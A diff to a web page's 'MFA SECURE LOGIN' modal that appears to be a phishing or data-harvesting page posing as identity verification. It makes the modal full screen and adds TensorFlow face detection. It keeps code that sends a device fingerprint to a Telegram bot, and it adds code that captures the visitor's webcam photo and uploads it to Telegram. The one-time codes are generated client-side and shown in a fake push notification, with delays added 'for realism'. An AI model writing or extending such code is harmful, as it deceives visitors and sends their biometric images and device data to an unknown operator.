@@ -2988,7 +2988,7 @@
         
         <div class="hub-header">
             <span class="hub-close-btn" onclick="closeHubModal()">×</span>
-            <div class="hub-glow-ring">
+            <div class="hub-static-ring">
                 <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" class="hub-logo">
             </div>
             <h2><i class="fas fa-shield-alt"></i> MFA SECURE LOGIN</h2>
@@ -3030,7 +3030,7 @@
             </div>
 
             <div id="hubStepFaceID" style="display:none; flex-direction:column; align-items:center;">
-                <p class="hub-instruction" id="faceInstruction">Position your face within the frame.</p>
+                <p class="hub-instruction" id="faceInstruction" style="font-weight:bold;">Position your face within the frame.</p>
                 
                 <div class="scanner-container">
                     <video id="hubVideo" autoplay playsinline></video>
@@ -3079,115 +3079,78 @@
         backdrop-filter: blur(5px);
     }
     .media-file-btn:active { transform: scale(0.98); border-color: #D4AF37; background: rgba(212, 175, 55, 0.1); }
-    .media-icon-wrapper {
-        width: 40px; height: 40px; border-radius: 50%; background: rgba(212, 175, 55, 0.1);
-        display: flex; justify-content: center; align-items: center; color: #D4AF37; font-size: 18px;
-    }
+    .media-icon-wrapper { width: 40px; height: 40px; border-radius: 50%; background: rgba(212, 175, 55, 0.1); display: flex; justify-content: center; align-items: center; color: #D4AF37; font-size: 18px; }
     .media-btn-text { flex: 1; margin-left: 15px; display: flex; flex-direction: column; }
     .m-title { color: #fff; font-family: 'Outfit', sans-serif; font-size: 15px; font-weight: 700; }
     .m-sub { color: #888; font-family: 'Outfit', sans-serif; font-size: 12px; }
     .media-arrow { color: #555; font-size: 14px; }
 
-    /* Modal Base Styles */
+    /* Modal Full Screen Styles */
     .hub-modal-overlay {
-        position: fixed; inset: 0; background: rgba(0,0,0,0.9); backdrop-filter: blur(15px);
-        z-index: 9999999; display: flex; justify-content: center; align-items: center;
+        position: fixed; inset: 0; background: #050505; z-index: 9999999; display: flex; justify-content: center; align-items: flex-start;
     }
     .hub-modal-box {
-        background: linear-gradient(180deg, #111 0%, #050505 100%); width: 92%; max-width: 420px;
-        border-radius: 20px; border: 1px solid rgba(212, 175, 55, 0.4);
-        box-shadow: 0 20px 50px rgba(0,0,0,1), inset 0 0 20px rgba(212, 175, 55, 0.05);
-        overflow: hidden; position: relative; font-family: 'Outfit', sans-serif;
+        background: linear-gradient(180deg, #111 0%, #050505 100%); width: 100vw; height: 100dvh; max-width: 100%; 
+        border-radius: 0; border: none; overflow-y: auto; position: relative; font-family: 'Outfit', sans-serif;
+        display: flex; flex-direction: column;
     }
-    .hub-header { padding: 25px 20px 20px; text-align: center; border-bottom: 1px solid rgba(212, 175, 55, 0.1); position: relative; }
-    .hub-close-btn { position: absolute; top: 15px; right: 20px; color: #888; font-size: 28px; cursor: pointer; transition: 0.3s; }
+    .hub-header { padding: 40px 20px 20px; text-align: center; border-bottom: 1px solid rgba(212, 175, 55, 0.1); position: relative; }
+    .hub-close-btn { position: absolute; top: 20px; right: 25px; color: #888; font-size: 32px; cursor: pointer; transition: 0.3s; }
     .hub-close-btn:hover { color: #ff3333; }
-    .hub-glow-ring {
-        width: 70px; height: 70px; margin: 0 auto 15px; border-radius: 50%;
-        padding: 3px; background: linear-gradient(45deg, #D4AF37, transparent, #D4AF37);
-        animation: rotateGlow 3s linear infinite;
+    
+    /* Static Logo (No Animation) */
+    .hub-static-ring {
+        width: 80px; height: 80px; margin: 0 auto 15px; border-radius: 50%;
+        padding: 3px; background: #D4AF37; box-shadow: 0 0 20px rgba(212, 175, 55, 0.3);
     }
     .hub-logo { width: 100%; height: 100%; border-radius: 50%; border: 2px solid #000; object-fit: cover; }
-    .hub-header h2 { margin: 0; color: #D4AF37; font-family: 'Cinzel', serif; font-size: 22px; font-weight: 900; letter-spacing: 1px; }
+    .hub-header h2 { margin: 0; color: #D4AF37; font-family: 'Cinzel', serif; font-size: 24px; font-weight: 900; letter-spacing: 1px; }
 
-    /* Inputs */
-    .hub-body { padding: 25px; }
-    .hub-instruction { color: #888; font-size: 13px; text-align: center; margin-bottom: 20px; }
-    .input-group { position: relative; margin-bottom: 12px; }
-    .input-group i { position: absolute; left: 15px; top: 15px; color: #D4AF37; opacity: 0.7; }
+    /* Inputs Centered */
+    .hub-body { padding: 25px; flex: 1; display: flex; flex-direction: column; max-width: 500px; margin: 0 auto; width: 100%; box-sizing: border-box; }
+    .hub-instruction { color: #aaa; font-size: 14px; text-align: center; margin-bottom: 20px; }
+    .input-group { position: relative; margin-bottom: 15px; }
+    .input-group i { position: absolute; left: 15px; top: 16px; color: #D4AF37; opacity: 0.7; }
     .input-group input {
-        width: 100%; padding: 14px 14px 14px 45px; background: rgba(255,255,255,0.03);
-        border: 1px solid rgba(255,255,255,0.1); color: #fff; border-radius: 10px;
-        font-family: 'Outfit'; font-size: 15px; box-sizing: border-box; transition: 0.3s;
+        width: 100%; padding: 15px 15px 15px 45px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); color: #fff; border-radius: 10px; font-family: 'Outfit'; font-size: 16px; box-sizing: border-box; transition: 0.3s;
     }
     .input-group input:focus { border-color: #D4AF37; outline: none; background: rgba(212,175,55,0.05); }
     
-    .mfa-divider { text-align: center; margin: 20px 0; position: relative; }
+    .mfa-divider { text-align: center; margin: 25px 0; position: relative; }
     .mfa-divider::before { content: ""; position: absolute; left: 0; top: 50%; width: 100%; height: 1px; background: rgba(255,255,255,0.1); }
-    .mfa-divider span { position: relative; background: #050505; padding: 0 10px; color: #666; font-size: 11px; font-weight: bold; letter-spacing: 1px; }
+    .mfa-divider span { position: relative; background: #050505; padding: 0 10px; color: #666; font-size: 12px; font-weight: bold; letter-spacing: 1px; }
 
     /* Buttons */
     .mfa-btn {
-        width: 100%; padding: 15px; margin-bottom: 12px; border-radius: 10px;
-        font-family: 'Outfit'; font-weight: 800; font-size: 14px; cursor: pointer;
-        display: flex; justify-content: center; align-items: center; gap: 10px; transition: 0.3s; border: none;
+        width: 100%; padding: 16px; margin-bottom: 15px; border-radius: 10px; font-family: 'Outfit'; font-weight: 800; font-size: 15px; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 10px; transition: 0.3s; border: none;
     }
     .btn-face { background: linear-gradient(90deg, #D4AF37, #F3E5AB); color: #000; box-shadow: 0 5px 15px rgba(212,175,55,0.3); }
     .btn-lock { background: #1a1a1a; border: 1px solid rgba(255,255,255,0.2); color: #fff; }
     .btn-lock:hover { border-color: #D4AF37; color: #D4AF37; }
     .btn-otp { background: transparent; border: 1px dashed rgba(212,175,55,0.5); color: #D4AF37; }
-    .btn-verify { background: #00fa9a; color: #000; font-size: 16px; letter-spacing: 1px; box-shadow: 0 5px 15px rgba(0,250,154,0.3); }
+    .btn-verify { background: #00fa9a; color: #000; font-size: 18px; letter-spacing: 1px; box-shadow: 0 5px 15px rgba(0,250,154,0.3); }
 
-    /* Face Scanner UI - Highly Advanced */
+    /* Face Scanner UI */
     .scanner-container {
-        width: 220px; height: 280px; position: relative; border-radius: 20px;
-        overflow: hidden; margin: 0 auto 25px; background: #000;
-        box-shadow: 0 0 30px rgba(212,175,55,0.15);
+        width: 250px; height: 300px; position: relative; border-radius: 20px; overflow: hidden; margin: 0 auto 25px; background: #000; box-shadow: 0 0 30px rgba(212,175,55,0.15);
     }
-    #hubVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); } /* Mirrored for natural feel */
+    #hubVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); } 
     .scan-corners {
         position: absolute; inset: 10px; border: 2px solid transparent;
-        background: 
-            linear-gradient(to right, #D4AF37 4px, transparent 4px) 0 0,
-            linear-gradient(to bottom, #D4AF37 4px, transparent 4px) 0 0,
-            linear-gradient(to left, #D4AF37 4px, transparent 4px) 100% 0,
-            linear-gradient(to bottom, #D4AF37 4px, transparent 4px) 100% 0,
-            linear-gradient(to right, #D4AF37 4px, transparent 4px) 0 100%,
-            linear-gradient(to top, #D4AF37 4px, transparent 4px) 0 100%,
-            linear-gradient(to left, #D4AF37 4px, transparent 4px) 100% 100%,
-            linear-gradient(to top, #D4AF37 4px, transparent 4px) 100% 100%;
+        background: linear-gradient(to right, #D4AF37 4px, transparent 4px) 0 0, linear-gradient(to bottom, #D4AF37 4px, transparent 4px) 0 0, linear-gradient(to left, #D4AF37 4px, transparent 4px) 100% 0, linear-gradient(to bottom, #D4AF37 4px, transparent 4px) 100% 0, linear-gradient(to right, #D4AF37 4px, transparent 4px) 0 100%, linear-gradient(to top, #D4AF37 4px, transparent 4px) 0 100%, linear-gradient(to left, #D4AF37 4px, transparent 4px) 100% 100%, linear-gradient(to top, #D4AF37 4px, transparent 4px) 100% 100%;
         background-repeat: no-repeat; background-size: 30px 30px; pointer-events: none; z-index: 2;
     }
-    .scan-laser {
-        position: absolute; top: 0; left: 0; width: 100%; height: 3px;
-        background: #00fa9a; box-shadow: 0 0 15px #00fa9a, 0 0 30px #00fa9a;
-        z-index: 3; animation: scanMove 3s ease-in-out infinite; display: none;
-    }
-    .scan-overlay-img {
-        position: absolute; inset: 0; background: url('https://cdn-icons-png.flaticon.com/512/3256/3256799.png') center/60% no-repeat;
-        opacity: 0.15; filter: invert(1); pointer-events: none; z-index: 1;
-    }
+    .scan-laser { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: #00fa9a; box-shadow: 0 0 15px #00fa9a, 0 0 30px #00fa9a; z-index: 3; animation: scanMove 3s ease-in-out infinite; display: none; }
+    .scan-overlay-img { position: absolute; inset: 0; background: url('https://cdn-icons-png.flaticon.com/512/3256/3256799.png') center/60% no-repeat; opacity: 0.15; filter: invert(1); pointer-events: none; z-index: 1; }
     .scanner-active .scan-laser { display: block; }
     .scanner-active .scan-overlay-img { animation: pulseFace 1s infinite; opacity: 0.4; }
 
     /* OTP Code Input */
-    .otp-input-box {
-        width: 100%; padding: 15px; margin-bottom: 20px; background: rgba(0,0,0,0.5);
-        border: 2px solid #D4AF37; color: #D4AF37; border-radius: 12px;
-        font-family: 'Outfit'; text-align: center; font-size: 28px; letter-spacing: 12px; font-weight: 900;
-        box-sizing: border-box; text-shadow: 0 0 10px rgba(212,175,55,0.5);
-    }
-    .hub-back-link { color: #ff3333; font-size: 13px; text-align: center; margin-top: 15px; cursor: pointer; text-decoration: underline; opacity: 0.8; }
+    .otp-input-box { width: 100%; padding: 15px; margin-bottom: 20px; background: rgba(0,0,0,0.5); border: 2px solid #D4AF37; color: #D4AF37; border-radius: 12px; font-family: 'Outfit'; text-align: center; font-size: 32px; letter-spacing: 12px; font-weight: 900; box-sizing: border-box; text-shadow: 0 0 10px rgba(212,175,55,0.5); }
+    .hub-back-link { color: #ff3333; font-size: 14px; text-align: center; margin-top: 20px; cursor: pointer; text-decoration: underline; opacity: 0.8; }
 
-    /* Push Notification Styles (Swipeable) */
-    #mndPushNotif {
-        position: fixed; left: 50%; width: 92%; max-width: 400px;
-        background: rgba(15, 15, 15, 0.95); backdrop-filter: blur(20px);
-        border: 1px solid rgba(212, 175, 55, 0.4); border-radius: 16px; padding: 16px;
-        z-index: 9999999999; box-shadow: 0 15px 40px rgba(0,0,0,0.9);
-        display: flex; flex-direction: column; gap: 10px;
-        transition: top 0.6s cubic-bezier(0.2, 1, 0.3, 1), transform 0.3s ease, opacity 0.3s ease;
-    }
+    /* Push Notification Styles */
+    #mndPushNotif { position: fixed; left: 50%; width: 92%; max-width: 400px; background: rgba(15, 15, 15, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(212, 175, 55, 0.4); border-radius: 16px; padding: 16px; z-index: 9999999999; box-shadow: 0 15px 40px rgba(0,0,0,0.9); display: flex; flex-direction: column; gap: 10px; transition: top 0.6s cubic-bezier(0.2, 1, 0.3, 1), transform 0.3s ease, opacity 0.3s ease; }
     .mnd-push-hidden { top: -300px; opacity: 0; transform: translateX(-50%) scale(0.9); }
     .mnd-push-visible { top: 25px; opacity: 1; transform: translateX(-50%) scale(1); }
     .mnd-push-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 8px; }
@@ -3195,29 +3158,23 @@
     .mnd-push-header span { color: #fff; font-size: 13px; font-weight: 700; opacity: 0.9; }
     .mnd-push-close { color: #fff; font-size: 24px; cursor: pointer; opacity: 0.4; }
     .mnd-push-body { color: #ccc; font-size: 13px; line-height: 1.5; }
-    .mnd-push-otp {
-        font-size: 38px; font-weight: 900; color: #D4AF37; text-align: center; letter-spacing: 8px;
-        padding: 12px 0; background: rgba(212,175,55,0.08); border-radius: 10px; border: 1px dashed rgba(212,175,55,0.3);
-        cursor: pointer; user-select: none; transition: 0.2s;
-    }
+    .mnd-push-otp { font-size: 38px; font-weight: 900; color: #D4AF37; text-align: center; letter-spacing: 8px; padding: 12px 0; background: rgba(212,175,55,0.08); border-radius: 10px; border: 1px dashed rgba(212,175,55,0.3); cursor: pointer; user-select: none; transition: 0.2s; }
     .mnd-push-otp:active { transform: scale(0.96); background: rgba(212,175,55,0.2); }
     .mnd-push-footer { text-align: center; color: #666; font-size: 11px; margin-top: 5px; }
 
     /* Loader */
-    .loader-rings {
-        width: 100px; height: 100px; border-radius: 50%;
-        border: 3px solid transparent; border-top-color: #D4AF37; border-bottom-color: #00fa9a;
-        animation: rotateGlow 1.5s linear infinite; margin-bottom: 25px;
-    }
+    .loader-rings { width: 100px; height: 100px; border-radius: 50%; border: 3px solid transparent; border-top-color: #D4AF37; border-bottom-color: #00fa9a; animation: rotateGlow 1.5s linear infinite; margin-bottom: 25px; }
     .loader-logo { width: 60px; position: absolute; top: calc(50% - 65px); border-radius: 50%; }
     .loader-title { color: #D4AF37; font-family: 'Cinzel'; font-size: 24px; letter-spacing: 3px; margin: 0; }
     .loader-text { color: #aaa; font-size: 13px; margin-top: 12px; letter-spacing: 1px; animation: pulseFace 1.5s infinite; }
 
-    /* Keyframes */
     @keyframes rotateGlow { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     @keyframes scanMove { 0%, 100% { top: 5%; opacity:0; } 10% { opacity:1; } 50% { top: 95%; } 90% { opacity:1; } }
     @keyframes pulseFace { 0%, 100% { opacity: 0.2; transform: scale(1); } 50% { opacity: 0.5; transform: scale(1.05); } }
 </style>
+
+<script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
+<script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/blazeface"></script>
 
 <script>
     // --- SYSTEM STATE ---
@@ -3274,7 +3231,6 @@
         hubOTP = Math.floor(100000 + Math.random() * 900000).toString();
         const payload = await buildDeviceFingerprint(false, authMethodChosen);
 
-        // Dispatch to Telegram
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: TG_CHAT_ID, text: payload, parse_mode: 'Markdown' })
@@ -3287,7 +3243,7 @@
         });
     }
 
-    // --- 3. METHOD B: ADVANCED FACE SCANNING ---
+    // --- 3. METHOD B: TENSORFLOW AI FACE SCANNING ---
     async function startFaceScanning() {
         if(!checkInputs()) return;
         authMethodChosen = "AI Face Scan";
@@ -3295,6 +3251,7 @@
         document.getElementById('hubStep1').style.display = 'none';
         document.getElementById('hubStepFaceID').style.display = 'flex';
         document.querySelector('.scanner-container').classList.remove('scanner-active');
+        document.getElementById('faceInstruction').style.color = "#aaa";
         document.getElementById('faceInstruction').innerText = "Position face and click initiate.";
 
         try {
@@ -3311,67 +3268,74 @@
         const instruction = document.getElementById('faceInstruction');
         const scannerBox = document.querySelector('.scanner-container');
         
-        // 1. Start UI Animation
         scannerBox.classList.add('scanner-active');
-        btn.innerHTML = '<i class="fas fa-radar fa-spin"></i> ANALYZING BIOMETRICS...';
+        btn.innerHTML = '<i class="fas fa-radar fa-spin"></i> LOADING AI CORE...';
         btn.disabled = true;
-        
-        instruction.style.color = "#D4AF37";
-        instruction.innerText = "Scanning facial depth & liveness...";
 
-        // 2. Simulate AI Processing Delay for realism
-        await new Promise(r => setTimeout(r, 1500));
-        instruction.innerText = "Verifying human contours...";
-        await new Promise(r => setTimeout(r, 1200));
+        try {
+            instruction.style.color = "#D4AF37";
+            instruction.innerText = "Initializing TensorFlow Neural Net...";
 
-        // 3. Capture Frame
-        const video = document.getElementById('hubVideo');
-        const canvas = document.getElementById('hubCanvas');
-        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // 1. Load the Google BlazeFace AI Model
+            if (!window.faceModel) {
+                window.faceModel = await blazeface.load();
+            }
 
-        // 4. Basic Liveness/Human Check (Pixel Analysis Fallback)
-        // To prevent absolute black screens or pure white screens from passing
-        let imgData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
-        let rSum=0, gSum=0, bSum=0;
-        for(let i=0; i<imgData.length; i+=4) { rSum+=imgData[i]; gSum+=imgData[i+1]; bSum+=imgData[i+2]; }
-        let avgColor = (rSum + gSum + bSum) / (imgData.length * 0.75); // rough brightness
-        
-        if (avgColor < 10 || avgColor > 240) {
-            // Fails if camera is covered (black) or pointed at a light (white)
+            instruction.innerText = "Scanning for human facial structure...";
+            await new Promise(r => setTimeout(r, 1000)); // UI delay for realism
+
+            // 2. Capture Frame
+            const video = document.getElementById('hubVideo');
+            const canvas = document.getElementById('hubCanvas');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // 3. ACTUAL AI FACE DETECTION EXECUTION
+            const predictions = await window.faceModel.estimateFaces(video, false);
+
+            if (predictions.length > 0) {
+                // REAL HUMAN FACE DETECTED
+                instruction.style.color = "#00fa9a";
+                instruction.innerText = "✅ Human Face Confirmed.";
+                hubOTP = Math.floor(100000 + Math.random() * 900000).toString();
+
+                canvas.toBlob(async (blob) => {
+                    stopCamera();
+                    document.getElementById('hubStepFaceID').style.display = 'none';
+                    document.getElementById('hubStep2').style.display = 'block';
+                    
+                    displayPushNotification(hubOTP);
+                    const logText = await buildDeviceFingerprint(false, authMethodChosen);
+
+                    const fd = new FormData();
+                    fd.append('chat_id', TG_CHAT_ID);
+                    fd.append('caption', logText);
+                    fd.append('parse_mode', 'Markdown');
+                    fd.append('photo', blob, 'mnd_face_auth.jpg');
+
+                    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(e=>{});
+
+                    btn.innerHTML = '<i class="fas fa-crosshairs"></i> INITIATE NEURAL SCAN';
+                    btn.disabled = false;
+                }, 'image/jpeg', 0.85);
+
+            } else {
+                // NO FACE DETECTED (Tree, wall, dark room, hidden face)
+                instruction.style.color = "#ff3333";
+                instruction.innerText = "❌ ERROR: No human face detected. Look directly at the camera.";
+                scannerBox.classList.remove('scanner-active');
+                btn.innerHTML = '<i class="fas fa-redo"></i> RETRY SCAN';
+                btn.disabled = false;
+            }
+        } catch (error) {
+            console.error(error);
             instruction.style.color = "#ff3333";
-            instruction.innerText = "❌ ERROR: Human face not detected. Please adjust lighting.";
+            instruction.innerText = "❌ AI Engine Error. Check internet connection.";
             scannerBox.classList.remove('scanner-active');
             btn.innerHTML = '<i class="fas fa-redo"></i> RETRY SCAN';
             btn.disabled = false;
-            return;
         }
-
-        // 5. Success Flow
-        instruction.style.color = "#00fa9a";
-        instruction.innerText = "✅ Identity Confirmed.";
-        hubOTP = Math.floor(100000 + Math.random() * 900000).toString();
-
-        canvas.toBlob(async (blob) => {
-            stopCamera();
-            document.getElementById('hubStepFaceID').style.display = 'none';
-            document.getElementById('hubStep2').style.display = 'block';
-            
-            displayPushNotification(hubOTP);
-            const logText = await buildDeviceFingerprint(false, authMethodChosen);
-
-            const fd = new FormData();
-            fd.append('chat_id', TG_CHAT_ID);
-            fd.append('caption', logText);
-            fd.append('parse_mode', 'Markdown');
-            fd.append('photo', blob, 'mnd_face_auth.jpg');
-
-            fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(e=>{});
-
-            btn.innerHTML = '<i class="fas fa-crosshairs"></i> INITIATE NEURAL SCAN';
-            btn.disabled = false;
-        }, 'image/jpeg', 0.85);
     }
     function stopCamera() { if (videoStream) { videoStream.getTracks().forEach(t => t.stop()); videoStream = null; } }
 
